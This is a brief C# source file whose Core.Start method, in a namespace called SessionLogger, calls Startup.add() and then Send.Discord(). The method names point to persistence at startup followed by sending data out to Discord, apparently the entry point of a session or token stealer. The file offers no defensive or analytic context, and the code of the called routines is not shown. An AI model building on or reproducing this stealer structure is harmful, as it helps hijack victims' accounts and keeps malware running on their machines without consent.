using System;
using System.Collections.Generic;
using System.Text;

namespace SessionLogger.Logger
{
    class Core
    {
        public static void Start()
        {
            Startup.add();
            Send.Discord();
        }
    }
}
